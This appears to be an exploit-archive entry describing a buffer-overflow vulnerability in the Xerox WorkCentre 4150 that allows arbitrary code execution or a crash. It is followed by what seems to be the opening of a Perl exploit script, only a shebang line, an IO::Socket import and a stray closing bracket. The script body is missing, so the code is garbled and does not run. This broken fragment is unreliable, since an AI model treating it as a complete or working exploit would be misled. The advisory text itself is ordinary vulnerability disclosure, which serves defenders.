Xerox WorkCentre is prone to a buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.

Attackers can exploit this issue to execute arbitrary code with the privileges of the application or crash the affected application.

Xerox WorkCentre 4150 is vulnerable; other versions may also be affected.

#!/usr/bin/perl -w


use IO::Socket;

);
